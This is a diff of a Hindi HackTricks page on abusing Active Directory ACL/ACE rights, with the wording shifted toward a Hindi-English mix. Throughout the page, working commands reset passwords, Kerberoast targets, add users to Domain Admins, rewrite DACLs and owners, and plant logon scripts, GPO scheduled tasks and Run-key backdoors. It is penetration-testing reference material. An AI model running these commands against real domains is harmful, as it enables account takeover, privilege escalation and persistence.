@@ -1,8 +1,8 @@
-# Active Directory ACLs/ACEs का दुरुपयोग
+# Abusing Active Directory ACLs/ACEs
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**यह पृष्ठ मुख्य रूप से तकनीकों का सारांश है जो** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. अधिक विवरण के लिए, मूल लेख देखें।**
+**यह पेज मुख्य रूप से इन तकनीकों का सारांश है** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. अधिक विवरण के लिए, मूल लेख देखें।**
 
 ## BadSuccessor
 
@@ -11,47 +11,47 @@
 BadSuccessor.md
 {{#endref}}
 
-## **GenericAll अधिकार उपयोगकर्ता पर**
+## **GenericAll Rights on User**
 
-यह अधिकार हमलावर को लक्षित उपयोगकर्ता खाते पर पूर्ण नियंत्रण प्रदान करता है। एक बार `GenericAll` अधिकार `Get-ObjectAcl` कमांड के साथ पुष्ट हो जाने पर, हमलावर कर सकता है:
+यह privilege attacker को target user account पर पूरा control देता है। एक बार `Get-ObjectAcl` command का उपयोग करके `GenericAll` rights confirm हो जाने पर, attacker यह कर सकता है:
 
-- **लक्षित का पासवर्ड बदलें**: `net user <username> <password> /domain` का उपयोग करके, हमलावर उपयोगकर्ता का पासवर्ड रीसेट कर सकता है।
-- Linux से, आप SAMR के ऊपर Samba `net rpc` के साथ भी वही कर सकते हैं:
+- **Target का Password बदलना**: `net user <username> <password> /domain` का उपयोग करके, attacker user का password reset कर सकता है।
+- Linux से, आप Samba `net rpc` के साथ SAMR के जरिए भी यही कर सकते हैं:
 ```bash
 # Reset target user's password over SAMR from Linux
 net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
 ```
-- **यदि खाता अक्षम है, तो UAC फ़्लैग साफ़ करें**: `GenericAll` को `userAccountControl` को संपादित करने की अनुमति देता है। Linux से, BloodyAD `ACCOUNTDISABLE` फ़्लैग हटा सकता है:
+- **यदि account disabled है, तो UAC flag साफ़ करें**: `GenericAll` `userAccountControl` को edit करने की अनुमति देता है। Linux से, BloodyAD `ACCOUNTDISABLE` flag को हटा सकता है:
 ```bash
 bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
 ```
-- **Targeted Kerberoasting**: SPN को उपयोगकर्ता के खाते में असाइन करें ताकि वह kerberoastable बने, फिर Rubeus और targetedKerberoast.py का उपयोग करके ticket-granting ticket (TGT) hashes को निकालें और क्रैक करने का प्रयास करें।
+- **Targeted Kerberoasting**: SPN को उपयोगकर्ता के account पर assign करें ताकि वह kerberoastable बन जाए, फिर Rubeus और targetedKerberoast.py का उपयोग करके ticket-granting ticket (TGT) hashes को extract करें और crack करने का प्रयास करें.
 ```bash
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-- **Targeted ASREPRoasting**: उपयोगकर्ता के लिए पूर्व-प्रमाणीकरण अक्षम करें, जिससे उनका खाता ASREPRoasting के प्रति संवेदनशील हो जाएगा।
+- **Targeted ASREPRoasting**: उपयोगकर्ता के लिए pre-authentication को disable करें, जिससे उनका account ASREPRoasting के लिए vulnerable हो जाता है.
 ```bash
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
-- **Shadow Credentials / Key Credential Link**: यदि किसी user पर `GenericAll` हो तो आप एक certificate-based credential जोड़कर उनके पासवर्ड को बदले बिना उनके रूप में authenticate कर सकते हैं। देखें:
+- **Shadow Credentials / Key Credential Link**: किसी user पर `GenericAll` के साथ आप certificate-based credential जोड़ सकते हैं और उनके password को बदले बिना उनके रूप में authenticate कर सकते हैं। देखें:
 
 {{#ref}}
 shadow-credentials.md
 {{#endref}}
 
-## **Group पर GenericAll अधिकार**
+## **Group पर GenericAll Rights**
 
-यह अधिकार हमलावर को समूह की सदस्यताएँ हेरफेर करने की अनुमति देता है यदि उनके पास किसी समूह जैसे `Domain Admins` पर `GenericAll` अधिकार हों। समूह का distinguished name `Get-NetGroup` से पहचानने के बाद, हमलावर कर सकता है:
+यह privilege attacker को group memberships manipulate करने की अनुमति देता है अगर उनके पास `Domain Admins` जैसे किसी group पर `GenericAll` rights हों। `Get-NetGroup` के साथ group का distinguished name identify करने के बाद, attacker कर सकता है:
 
-- **Domain Admins Group में खुद को जोड़ें**: यह प्रत्यक्ष commands या Active Directory या PowerSploit जैसे modules का उपयोग करके किया जा सकता है।
+- **अपने आप को Domain Admins Group में जोड़ना**: यह direct commands के जरिए या Active Directory या PowerSploit जैसे modules का उपयोग करके किया जा सकता है।
 ```bash
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
-- Linux से आप BloodyAD का भी उपयोग करके खुद को किसी भी समूह में जोड़ सकते हैं जब आपके पास उन पर GenericAll/Write सदस्यता हो। यदि लक्ष्य समूह “Remote Management Users” के भीतर निहित है, तो आप उन होस्ट्स पर तुरंत WinRM पहुंच प्राप्त कर लेंगे जो उस समूह का सम्मान करते हैं:
+- Linux से आप BloodyAD का उपयोग करके स्वयं को arbitrary groups में जोड़ सकते हैं जब आपके पास उन पर GenericAll/Write membership हो। अगर target group “Remote Management Users” में nested है, तो आपको उन hosts पर तुरंत WinRM access मिल जाएगा जो उस group को honor करते हैं:
 ```bash
 # Linux tooling example (BloodyAD) to add yourself to a target group
 bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>
@@ -61,35 +61,35 @@ netexec winrm <dc-fqdn> -u <user> -p '<pass>'
 ```
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
-एक computer object या user account पर ये privileges होने पर निम्न संभव होते हैं:
+किसी computer object या user account पर ये privileges होने से निम्न संभव होता है:
 
-- **Kerberos Resource-based Constrained Delegation**: यह एक computer object पर कब्ज़ा करने की अनुमति देता है।
-- **Shadow Credentials**: इन privileges का उपयोग करके shadow credentials बनाकर किसी computer या user account का impersonate करने के लिए इस technique का उपयोग करें।
+- **Kerberos Resource-based Constrained Delegation**: किसी computer object का takeover करने में सक्षम बनाता है।
+- **Shadow Credentials**: shadow credentials बनाने के privileges का दुरुपयोग करके किसी computer या user account की impersonation करने के लिए इस technique का उपयोग करें।
 
 ## **WriteProperty on Group**
 
-यदि किसी user के पास किसी विशेष group (उदा., `Domain Admins`) के सभी objects पर `WriteProperty` rights हैं, तो वे:
+यदि किसी user के पास किसी specific group (उदा., `Domain Admins`) के सभी objects पर `WriteProperty` rights हैं, तो वे:
 
-- **Add Themselves to the Domain Admins Group**: यह `net user` और `Add-NetGroupUser` कमांड्स को मिलाकर किया जा सकता है; यह तरीका डोमेन के भीतर privilege escalation की अनुमति देता है।
+- **Add Themselves to the Domain Admins Group**: `net user` और `Add-NetGroupUser` commands को combine करके हासिल किया जा सकता है; यह method domain के भीतर privilege escalation की अनुमति देता है।
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 ## **Self (Self-Membership) on Group**
 
-यह विशेषाधिकार attackers को सीधे समूह सदस्यता को बदलने वाले कमांड्स के माध्यम से `Domain Admins` जैसे विशिष्ट समूहों में खुद को जोड़ने में सक्षम बनाता है। निम्न कमांड अनुक्रम का उपयोग करके स्वयं को जोड़ना संभव है:
+यह विशेषाधिकार हमलावरों को सीधे group membership manipulate करने वाले commands के माध्यम से खुद को specific groups, जैसे `Domain Admins`, में जोड़ने की अनुमति देता है। निम्नलिखित command sequence का उपयोग self-addition की अनुमति देता है:
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 ## **WriteProperty (Self-Membership)**
 
-एक समान विशेषाधिकार — यदि किसी के पास किसी समूह पर `WriteProperty` अधिकार है, तो यह हमलावरों को समूह की properties संशोधित करके स्वयं को सीधे समूह में जोड़ने की अनुमति देता है। इस विशेषाधिकार की पुष्टि और निष्पादन निम्नलिखित के साथ किया जाता है:
+एक समान privilege, यह attackers को सीधे groups में खुद को add करने देता है, group properties को modify करके, यदि उनके पास उन groups पर `WriteProperty` right हो। इस privilege की confirmation और execution इस प्रकार की जाती है:
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
 ## **ForceChangePassword**
 
-किसी उपयोगकर्ता पर User-Force-Change-Password के लिए ExtendedRight होने पर वर्तमान पासवर्ड जाने बिना पासवर्ड रीसेट करना संभव होता है। इस अधिकार की पुष्टि और इसका शोषण PowerShell या वैकल्पिक कमांड-लाइन टूल्स के माध्यम से किया जा सकता है, जो उपयोगकर्ता के पासवर्ड को रीसेट करने के कई तरीके प्रदान करते हैं — interactive sessions और non-interactive environments के लिए one-liners सहित। कमांड सरल PowerShell invocations से लेकर Linux पर rpcclient के उपयोग तक भिन्न होते हैं, जो attack vectors की बहुमुखी प्रतिभा दर्शाते हैं।
+किसी user पर `User-Force-Change-Password` के लिए `ExtendedRight` होना current password जाने बिना password reset करने देता है। इस right की verification और इसका exploitation PowerShell या alternative command-line tools के जरिए किया जा सकता है, जो user का password reset करने के कई तरीके देते हैं, जिसमें interactive sessions और non-interactive environments के लिए one-liners शामिल हैं। Commands simple PowerShell invocations से लेकर Linux पर `rpcclient` के उपयोग तक फैली होती हैं, जो attack vectors की versatility दिखाती हैं।
 ```bash
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -100,23 +100,23 @@ Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureStri
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
-## **WriteOwner on Group**
+## **Group पर WriteOwner**
 
-यदि किसी हमलावर को पता चलता है कि उसके पास किसी समूह पर `WriteOwner` अधिकार हैं, तो वह समूह का मालिकाना हक अपने नाम कर सकता है। यह विशेष रूप से प्रभावी होता है जब संबंधित समूह `Domain Admins` हो, क्योंकि ownership बदलने से समूह के गुण और सदस्यता पर व्यापक नियंत्रण मिल जाता है। प्रक्रिया में सही ऑब्जेक्ट की पहचान `Get-ObjectAcl` के माध्यम से करना और फिर `Set-DomainObjectOwner` का उपयोग करके owner को SID या नाम द्वारा बदलना शामिल है।
+यदि कोई attacker पाता है कि उसके पास किसी group पर `WriteOwner` rights हैं, तो वह उस group का ownership अपने नाम पर बदल सकता है। यह खास तौर पर तब प्रभावी होता है जब संबंधित group `Domain Admins` हो, क्योंकि ownership बदलने से group attributes और membership पर अधिक व्यापक control मिल जाता है। इस process में `Get-ObjectAcl` के जरिए सही object की पहचान करना और फिर `Set-DomainObjectOwner` का उपयोग करके owner को, चाहे SID से हो या name से, modify करना शामिल है।
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
-## **GenericWrite on User**
+## **User पर GenericWrite**
 
-यह अनुमति हमलावर को उपयोगकर्ता की गुणधर्मों को संशोधित करने की अनुमति देती है। विशेष रूप से, `GenericWrite` एक्सेस के साथ, हमलावर किसी उपयोगकर्ता के logon script path को बदल सकता है ताकि उपयोगकर्ता के लॉगऑन पर एक हानिकारक स्क्रिप्ट निष्पादित हो सके। यह `Set-ADObject` कमांड का उपयोग करके किया जाता है, जो लक्षित उपयोगकर्ता की `scriptpath` प्रॉपर्टी को अपडेट करके उसे हमलावर की स्क्रिप्ट की ओर इंगित करता है।
+यह अनुमति एक attacker को user properties modify करने देती है। Specifically, `GenericWrite` access के साथ, attacker किसी user के logon script path को बदल सकता है ताकि user के logon करते ही एक malicious script execute हो। यह `Set-ADObject` command का उपयोग करके target user की `scriptpath` property को update करके किया जाता है, ताकि वह attacker's script की ओर point करे।
 ```bash
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
-## **GenericWrite on Group**
+## **Group पर GenericWrite**
 
-इस विशेषाधिकार के साथ, हमलावर समूह की सदस्यता में छेड़छाड़ कर सकते हैं, जैसे कि स्वयं या अन्य उपयोगकर्ताओं को विशिष्ट समूहों में जोड़ना। इस प्रक्रिया में एक क्रेडेंशियल ऑब्जेक्ट बनाना, इसका उपयोग करके उपयोगकर्ताओं को समूह में जोड़ना या हटाना, और PowerShell कमांड्स के साथ सदस्यता परिवर्तनों की पुष्टि शामिल है।
+इस privilege के साथ, attackers group membership को manipulate कर सकते हैं, जैसे खुद को या अन्य users को specific groups में add करना। इस process में एक credential object बनाना, उसका उपयोग करके users को group में add या remove करना, और PowerShell commands के साथ membership changes को verify करना शामिल है।
 ```bash
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -124,7 +124,7 @@ Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'userna
 Get-DomainGroupMember -Identity "Group Name" | Select MemberName
 Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
 ```
-- Linux से, Samba `net` समूह पर `GenericWrite` अधिकार होने पर सदस्यों को जोड़/हटा सकता है (जब PowerShell/RSAT उपलब्ध नहीं हों तब उपयोगी):
+- Linux से, Samba `net` समूह में सदस्य जोड़/हटा सकता है जब आपके पास उस group पर `GenericWrite` हो (जब PowerShell/RSAT उपलब्ध न हों तब उपयोगी):
 ```bash
 # Add yourself to the target group via SAMR
 net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
@@ -133,7 +133,7 @@ net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
 ```
 ## **WriteDACL + WriteOwner**
 
-AD ऑब्जेक्ट का मालिक होना और उस पर `WriteDACL` privileges होना एक attacker को अपने लिए उस ऑब्जेक्ट पर `GenericAll` privileges देने में सक्षम बनाता है। यह ADSI manipulation के माध्यम से किया जाता है, जो ऑब्जेक्ट पर पूर्ण नियंत्रण और इसके group memberships को बदलने की क्षमता देता है। इसके बावजूद, Active Directory module के `Set-Acl` / `Get-Acl` cmdlets का उपयोग करके इन privileges को exploit करने के प्रयास में सीमाएँ मौजूद हैं।
+किसी AD object का ownership होना और उस पर `WriteDACL` privileges होना attacker को उस object पर खुद को `GenericAll` privileges देने में सक्षम बनाता है। यह ADSI manipulation के माध्यम से किया जाता है, जिससे object पर full control और उसकी group memberships को modify करने की ability मिलती है। इसके बावजूद, Active Directory module के `Set-Acl` / `Get-Acl` cmdlets का उपयोग करके इन privileges का exploit करने की कोशिश करते समय limitations मौजूद हैं।
 ```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -141,9 +141,9 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-### WriteDACL/WriteOwner त्वरित कब्ज़ा (PowerView)
+### WriteDACL/WriteOwner त्वरित takeover (PowerView)
 
-जब किसी user या service account पर आपके पास `WriteOwner` और `WriteDacl` हों, तो आप PowerView का उपयोग करके बिना पुराने पासवर्ड को जाने पूरा नियंत्रण लेकर उसका पासवर्ड रीसेट कर सकते हैं:
+जब आपके पास किसी user या service account पर `WriteOwner` और `WriteDacl` हो, तो आप पूरा control ले सकते हैं और old password जाने बिना PowerView का उपयोग करके उसका password reset कर सकते हैं:
 ```powershell
 # Load PowerView
 . .\PowerView.ps1
@@ -155,107 +155,162 @@ Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdent
 $cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
 Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
 ```
-नोट:
-- यदि आपके पास केवल `WriteOwner` है, तो आपको पहले owner को स्वयं के लिए बदलना पड़ सकता है:
+टिप्पणियाँ:
+- यदि आपके पास केवल `WriteOwner` है, तो आपको पहले owner को अपने नाम पर बदलना पड़ सकता है:
 ```powershell
 Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
 ```
-- पासवर्ड रीसेट के बाद किसी भी प्रोटोकॉल (SMB/LDAP/RDP/WinRM) से एक्सेस को सत्यापित करें।
+- पासवर्ड रीसेट के बाद किसी भी protocol (SMB/LDAP/RDP/WinRM) से access validate करें।
 
-## **डोमेन पर प्रतिकृति (DCSync)**
+## **Replication on the Domain (DCSync)**
 
-DCSync हमला डोमेन पर विशिष्ट replication permissions का लाभ उठाकर एक Domain Controller की नकल करता है और डेटा, जिसमें उपयोगकर्ता प्रमाण-पत्र भी शामिल हैं, को सिंक्रोनाइज़ करता है। यह शक्तिशाली तकनीक `DS-Replication-Get-Changes` जैसे permissions की आवश्यकता होती है, जिससे हमलावरों को AD environment से Domain Controller तक सीधे पहुँच के बिना संवेदनशील जानकारी निकालने की अनुमति मिलती है। [**Learn more about the DCSync attack here.**](../dcsync.md)
+DCSync attack domain पर specific replication permissions का leverage लेकर Domain Controller की तरह mimic करता है और data synchronize करता है, जिसमें user credentials भी शामिल हैं। इस powerful technique के लिए `DS-Replication-Get-Changes` जैसी permissions चाहिए, जो attackers को Domain Controller तक direct access के बिना AD environment से sensitive information extract करने देती हैं। [**DCSync attack के बारे में यहाँ और जानें।**](../dcsync.md)
 
 ## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>
 
 ### GPO Delegation
 
-Group Policy Objects (GPOs) को प्रबंधित करने के लिए सौंपा गया एक्सेस महत्वपूर्ण सुरक्षा जोखिम पैदा कर सकता है। उदाहरण के लिए, यदि किसी user जैसे `offense\spotless` को GPO प्रबंधन अधिकार सौंपे गए हैं, तो उसके पास **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसे privileges हो सकते हैं। इन permissions का दुरुपयोग malicious उद्देश्यों के लिए किया जा सकता है, जिन्हें PowerView का उपयोग करके पहचाना जा सकता है: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Group Policy Objects (GPOs) को manage करने के लिए delegated access significant security risks पैदा कर सकता है। उदाहरण के लिए, अगर `offense\spotless` जैसा user GPO management rights delegated है, तो उसके पास **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसी privileges हो सकती हैं। इन permissions का malicious purposes के लिए abuse किया जा सकता है, जैसा कि PowerView से identify किया गया: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-### GPO अनुमतियों का पता लगाना
+### Enumerate GPO Permissions
 
-गलत कॉन्फ़िगर किए गए GPOs की पहचान करने के लिए, PowerSploit के cmdlets को श्रृंखला में जोड़ा जा सकता है। यह उन GPOs की खोज करने की अनुमति देता है जिन्हें एक विशिष्ट user प्रबंधित करने के लिए permissions रखता है: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Misconfigured GPOs identify करने के लिए, PowerSploit के cmdlets को साथ में chain किया जा सकता है। इससे उन GPOs का discovery होता है जिन्हें कोई specific user manage करने की permissions रखता है: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Computers with a Given Policy Applied**: यह पता लगाना संभव है कि कौन से computers पर कोई विशेष GPO लागू है, जिससे संभावित प्रभाव के दायरे को समझने में मदद मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**किसी दिए गए Policy के लागू होने वाले Computers**: यह पता लगाना संभव है कि कोई specific GPO किन computers पर apply होती है, जिससे संभावित impact का scope समझने में मदद मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
-**Policies Applied to a Given Computer**: किसी विशिष्ट कंप्यूटर पर कौन सी नीतियाँ लागू हैं यह देखने के लिए `Get-DomainGPO` जैसे commands का उपयोग किया जा सकता है।
+**किसी दिए गए Computer पर लागू Policies**: किसी particular computer पर कौन-सी policies लागू हैं, यह देखने के लिए `Get-DomainGPO` जैसे commands का उपयोग किया जा सकता है।
 
-**OUs with a Given Policy Applied**: किसी नीति से प्रभावित organizational units (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।
+**किसी दिए गए Policy के लागू होने वाले OUs**: किसी दिए गए policy से प्रभावित organizational units (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।
 
-आप टूल [**GPOHound**](https://github.com/cogiceo/GPOHound) का उपयोग करके भी GPOs की सूची बना सकते हैं और उनमें समस्याएँ खोज सकते हैं।
+आप tool [**GPOHound**](https://github.com/cogiceo/GPOHound) का भी उपयोग करके GPOs enumerate कर सकते हैं और उनमें issues ढूँढ सकते हैं।
 
 ### Abuse GPO - New-GPOImmediateTask
 
-गलत कॉन्फ़िगर किए गए GPOs का दुरुपयोग कोड निष्पादित करने के लिए किया जा सकता है, उदाहरण के लिए एक immediate scheduled task बनाकर। इसे प्रभावित मशीनों पर किसी user को local administrators group में जोड़ने के लिए किया जा सकता है, जिससे privileges में काफी वृद्धि हो सकती है:
+Misconfigured GPOs का exploit code execute करने के लिए किया जा सकता है, उदाहरण के लिए immediate scheduled task बनाकर। यह affected machines पर user को local administrators group में जोड़ने के लिए किया जा सकता है, जिससे privileges काफी बढ़ जाते हैं:
 ```bash
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
 ### GroupPolicy module - Abuse GPO
 
-GroupPolicy module, यदि इंस्टॉल है, तो यह नए GPOs बनाने और लिंक करने तथा प्रभावित कंप्यूटरों पर backdoors चलाने के लिए registry values जैसी preferences सेट करने की अनुमति देता है। इस तरीके में GPO को अपडेट करना और execution के लिए किसी user का कंप्यूटर पर log in करना आवश्यक है:
+GroupPolicy module, यदि इंस्टॉल हो, तो नए GPOs बनाने और उन्हें लिंक करने की अनुमति देता है, और registry values जैसी preferences सेट करने की सुविधा देता है ताकि प्रभावित computers पर backdoors execute किए जा सकें। इस method के लिए GPO का updated होना और execution के लिए किसी user का computer में log in करना आवश्यक है:
 ```bash
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
-### SharpGPOAbuse - Abuse GPO
+### SharpGPOAbuse - GPO का दुरुपयोग
 
-SharpGPOAbuse मौजूदा GPOs का दुरुपयोग करने का एक तरीका प्रदान करता है जिससे आप नए GPOs बनाए बिना कार्य जोड़कर या सेटिंग्स संशोधित करके बदलाव कर सकते हैं। यह टूल परिवर्तन लागू करने से पहले मौजूदा GPOs में संशोधन करने या नए GPOs बनाने के लिए RSAT tools का उपयोग करने की आवश्यकता रखता है:
+SharpGPOAbuse मौजूदा GPOs का दुरुपयोग करने की एक विधि प्रदान करता है, जिसमें नए GPOs बनाए बिना tasks जोड़कर या settings संशोधित करके काम किया जाता है। इस tool के लिए मौजूदा GPOs में modification करना या बदलाव लागू करने से पहले नए GPOs बनाने के लिए RSAT tools का उपयोग करना आवश्यक है:
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
-### पॉलिसी को मजबूरन अपडेट करें
+### Force Policy Update
 
-GPO अपडेट सामान्यतः लगभग हर 90 मिनट में होते हैं। इस प्रक्रिया को तेज करने के लिए, खासकर किसी परिवर्तन को लागू करने के बाद, लक्ष्य कंप्यूटर पर `gpupdate /force` कमांड का उपयोग करके तुरंत पॉलिसी अपडेट मजबूर किया जा सकता है। यह कमांड सुनिश्चित करता है कि GPOs में किए गए किसी भी संशोधन को अगले स्वचालित अपडेट चक्र का इंतज़ार किए बिना लागू किया जाए।
+GPO updates आम तौर पर हर 90 मिनट के आसपास होती हैं। इस प्रक्रिया को तेज़ करने के लिए, खासकर किसी बदलाव को लागू करने के बाद, target computer पर `gpupdate /force` command का उपयोग तुरंत policy update forced करने के लिए किया जा सकता है। यह command सुनिश्चित करती है कि GPOs में किए गए कोई भी बदलाव अगली automatic update cycle का इंतज़ार किए बिना लागू हो जाएँ।
 
-### अंदर की जानकारी
+### Under the Hood
 
-किसी दिए गए GPO के लिए Scheduled Tasks का निरीक्षण करने पर, जैसे कि `Misconfigured Policy`, `evilTask` जैसी टास्क्स के जोड़े जाने की पुष्टि की जा सकती है। ये टास्क्स स्क्रिप्ट्स या कमांड-लाइन टूल्स के माध्यम से बनाए जाते हैं जो सिस्टम व्यवहार बदलने या प्रिविलेज़ एस्केलेशन का लक्ष्य रखते हैं।
+किसी दिए गए GPO, जैसे `Misconfigured Policy`, के Scheduled Tasks की inspection करने पर `evilTask` जैसे tasks का जोड़ confirm किया जा सकता है। ये tasks scripts या command-line tools के माध्यम से बनाए जाते हैं, जिनका उद्देश्य system behavior modify करना या privileges escalate करना होता है।
 
-टास्क की संरचना, जो `New-GPOImmediateTask` द्वारा जनरेट हुए XML configuration फ़ाइल में दिखाई जाती है, निर्धारित करती है कि शेड्यूल्ड टास्क के विशिष्ट विवरण क्या हैं — जिसमें निष्पादित किया जाने वाला कमांड और उसके triggers शामिल हैं। यह फ़ाइल दर्शाती है कि GPOs के भीतर शेड्यूल्ड टास्क कैसे परिभाषित और प्रबंधित होते हैं, और पॉलिसी लागू करने के हिस्से के रूप में arbitrary commands या scripts चलाने का एक तरीका प्रदान करती है।
+`New-GPOImmediateTask` द्वारा generated XML configuration file में दिखाए गए task की structure scheduled task की specifics बताती है - जिसमें execute होने वाला command और उसके triggers शामिल होते हैं। यह file दर्शाती है कि scheduled tasks GPOs के भीतर कैसे defined और managed होते हैं, और policy enforcement के हिस्से के रूप में arbitrary commands या scripts execute करने का एक method प्रदान करती है।
 
-### उपयोगकर्ता और समूह
+### Users and Groups
 
-GPOs लक्ष्य प्रणालियों पर उपयोगकर्ता और समूह सदस्यताओं में हेरफेर की अनुमति भी देती हैं। Users and Groups policy फ़ाइलों को सीधे एडिट करके, attackers privileged groups में उपयोगकर्ताओं को जोड़ सकते हैं, जैसे कि स्थानीय `administrators` समूह। यह GPO प्रबंधन अनुमतियों के delegation के माध्यम से संभव होता है, जो नीति फ़ाइलों में नए उपयोगकर्ताओं को शामिल करने या समूह सदस्यताओं को बदलने की अनुमति देता है।
+GPOs target systems पर user और group memberships के manipulation की भी अनुमति देती हैं। Users and Groups policy files को सीधे edit करके, attackers users को privileged groups, जैसे local `administrators` group, में जोड़ सकते हैं। यह GPO management permissions की delegation के माध्यम से संभव है, जो policy files को modify करके नए users जोड़ने या group memberships बदलने की अनुमति देती है।
 
-Users and Groups के XML configuration फ़ाइल में बताया गया है कि ये परिवर्तन कैसे लागू किए जाते हैं। इस फ़ाइल में एंट्रीज जोड़कर, विशिष्ट उपयोगकर्ताओं को प्रभावित सिस्टम्स में उच्च अधिकार दिए जा सकते हैं। यह पद्धति GPO हेरफेर के माध्यम से सीधे privilege escalation का एक रास्ता प्रदान करती है।
+Users and Groups के लिए XML configuration file बताती है कि ये changes कैसे implement किए जाते हैं। इस file में entries जोड़कर, specific users को affected systems पर elevated privileges दिए जा सकते हैं। यह method GPO manipulation के माध्यम से privilege escalation का एक direct approach प्रदान करती है।
 
